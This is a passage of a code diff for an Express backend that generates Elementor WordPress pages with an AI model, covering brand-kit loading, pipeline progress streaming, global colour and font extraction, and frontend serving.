+      const globals = await wpClient.getGlobals(creds);
+      globalKit = buildGlobalKit(globals);
+    } catch (err) {
+      console.warn('[generate] useGlobals: could not fetch Elementor globals, skipping:', err.message);
+    }
+  }
+  // Saved brand (brand manager): its palette/fonts act as the kit (a
+  // globals kit loses to a saved brand; an explicit preset brandKit wins),
+  // and its context text is appended to the brand context. Best-effort.
+  let savedBrandKit = null;
+  let effectiveBrandContext = brandContext;
+  if (nonEmpty(body.brandId)) {
+    try {
+      const saved = await brandStore.getBrand(creds, body.brandId);
+      if (saved) {
+        if (saved.palette || saved.fonts) {
+          savedBrandKit = {
+            id: `brand-${saved.id}`,
+            name: saved.name,
+            palette: saved.palette || {},
+            fonts: saved.fonts || {},
+          };
+        }
+        if (saved.context) {
+          effectiveBrandContext = effectiveBrandContext
+            ? `${effectiveBrandContext}\n${saved.context}`
+            : saved.context;
+        }
+      }
+    } catch (err) {
+      console.warn('[generate] brandId: could not load saved brand, skipping:', err.message);
+    }
+  }
+  // Component library: load the full elements for the requested ids so the
+  // pipeline can hand them to the model as proven reusable blocks.
+  let reuseComponents = [];
+  if (Array.isArray(body.componentIds) && body.componentIds.length) {
+    try {
+      reuseComponents = await componentStore.getComponents(creds, body.componentIds.slice(0, 10));
+    } catch (err) {
+      console.warn('[generate] componentIds: could not load components, skipping:', err.message);
+    }
+  }
+  // Site global widgets (opt-in): let the model embed the site's existing
+  // Elementor Pro global widgets. Best-effort — skipped on any failure.
+  let availableGlobalWidgets = [];
+  if (body.useGlobalWidgets === true && allowPro) {
+    try {
+      const gw = await wpClient.getGlobalWidgets(creds);
+      if (gw && gw.available && Array.isArray(gw.widgets)) {
+        availableGlobalWidgets = gw.widgets.slice(0, 30);
+      }
+    } catch (err) {
+      console.warn('[generate] useGlobalWidgets: could not load global widgets, skipping:', err.message);
+    }
+  }
+
+  let lastStage = null;
+  try {
+    const out = await runPipeline({
+      creds,
+      claudeKey,
+      claudeModel,
+      claudeUseCli,
+      mode: isRefine ? 'edit' : mode,
+      pageId: isRefine ? (pageId || (previousJson && previousJson.pageId)) : pageId,
+      prompt: effectivePrompt,
+      images,
+      template,
+      title,
+      status,
+      allowPro,
+      brandContext: effectiveBrandContext,
+      brandKit: brandKit || savedBrandKit,
+      globalKit,
+      reuseComponents,
+      availableGlobalWidgets,
+      autoRefine,
+      unsplashKey,
+      imageMode,
+      geminiKey,
+      sectionId,
+      includeHeader,
+      variationMode: !!body.variationMode,
+    }, (stage, extra) => {
+      if (stage === 'done') {
+        runStore.finish(run.id, extra);
+        send('done', extra);
+      } else {
+        // Always send on stage CHANGE; detail updates may repeat the same
+        // stage (e.g. 'generating' with '38,400 chars written').
+        lastStage = stage;
+        const payload = { stage };
+        if (extra && extra.detail) payload.detail = extra.detail;
+        runStore.update(run.id, stage, payload.detail);
+        send('progress', payload);
+      }
+    });
+    // out already emitted via 'done'
+    res.end();
+  } catch (err) {
+    // Log the precise failure server-side so we never have to guess which step
+    // (generating / validating / images / publishing) or endpoint broke.
+    console.error(`[${isRefine ? 'refine' : 'generate'}] failed at stage "${lastStage || 'startup'}":`, err && err.stack ? err.stack : err);
+    const errPayload = {
+      code: err.code || 'generate_failed',
+      step: lastStage || 'startup',
+      message: err.message,
+      rawOutput: err.rawOutput || undefined, // let the UI offer a raw download
+    };
+    runStore.fail(run.id, errPayload);
+    send('error', errPayload);
+    res.end();
+  }
+}
+
+/**
+ * Build a compact brand-kit-like object from the plugin's /globals payload
+ * ({ system_colors, custom_colors, system_typography, custom_typography }).
+ * Palette keys come from each entry's title (lowercased) — Elementor's
+ * defaults are Primary / Secondary / Text / Accent — plus any custom
+ * colors, capped at ~8. Returns null when the kit has nothing usable.
+ */
+function buildGlobalKit(globals) {
+  if (!globals || typeof globals !== 'object') return null;
+  const slug = (s, fallback) => {
+    const k = String(s || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '');
+    return k || fallback;
+  };
+  const palette = {};
+  const colors = []
+    .concat(Array.isArray(globals.system_colors) ? globals.system_colors : [])
+    .concat(Array.isArray(globals.custom_colors) ? globals.custom_colors : [])
+    .filter((c) => c && typeof c.color === 'string' && c.color)
+    .slice(0, 8);
+  colors.forEach((c, i) => {
+    let key = slug(c.title, `color_${i + 1}`);
+    while (key in palette) key += '_'; // never drop a color on a title clash
+    palette[key] = c.color;
+  });
+  const fonts = {};
+  const typos = []
+    .concat(Array.isArray(globals.system_typography) ? globals.system_typography : [])
+    .concat(Array.isArray(globals.custom_typography) ? globals.custom_typography : [])
+    .filter((t) => t && typeof t.typography_font_family === 'string' && t.typography_font_family)
+    .slice(0, 8);
+  typos.forEach((t, i) => {
+    let key = slug(t.title, `font_${i + 1}`);
+    while (key in fonts) key += '_';
+    fonts[key] = t.typography_font_weight
+      ? `${t.typography_font_family} (weight ${t.typography_font_weight})`
+      : t.typography_font_family;
+  });
+  // Convenience aliases the model already understands from preset kits:
+  // Elementor's "Primary" typography styles headings, "Text" styles body copy.
+  if (!fonts.heading) {
+    const heading = typos.find((t) => /primary/i.test(t.title || '')) || typos[0];
+    if (heading) fonts.heading = heading.typography_font_family;
+  }
+  if (!fonts.body) {
+    const body = typos.find((t) => /text|body/i.test(t.title || '')) || typos[typos.length - 1];
+    if (body) fonts.body = body.typography_font_family;
+  }
+
+  if (Object.keys(palette).length === 0 && Object.keys(fonts).length === 0) return null;
+
+  return {
+    id: 'elementor-globals',
+    name: 'Elementor Global Colors & Fonts (site kit)',
+    palette,
+    fonts,
+  };
+}
+
+/** ---------- Global JSON error fallback ---------- */
+app.use((err, _req, res, _next) => {
+  res.status(err.status || 500).json({ error: { code: err.code || 'server_error', message: err.message } });
+});
+
+// ---------- Serve the built frontend (single-service deploy) ----------
+// When frontend/dist exists (Docker build, or a local `npm run build`), this
+// server hosts the UI as well, so Railway needs one service and there is no
+// cross-origin cookie problem. API routes are registered ABOVE this, so they
+// always win; anything else falls through to index.html for the SPA.
+const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');
+if (fs.existsSync(path.join(FRONTEND_DIST, 'index.html'))) {
+  app.use(express.static(FRONTEND_DIST, { index: false, maxAge: '1h' }));
+  app.get(/^(?!\/api\/|\/health).*/, (_req, res) => {
+    res.sendFile(path.join(FRONTEND_DIST, 'index.html'));
+  });
+  console.log('[web] serving built frontend from', FRONTEND_DIST);
+}
+
+app.listen(PORT, () => {
+  console.log(`EAI backend listening on :${PORT} (frontend origin: ${FRONTEND_ORIGIN})`);
+  // Daily zip backups of all app data (history/components/brands). Never fatal.
+  try {
+    startBackupScheduler();
+  } catch (err) {
+    console.warn('Backup scheduler failed to start (non-fatal):', err.message);
+  }
+});
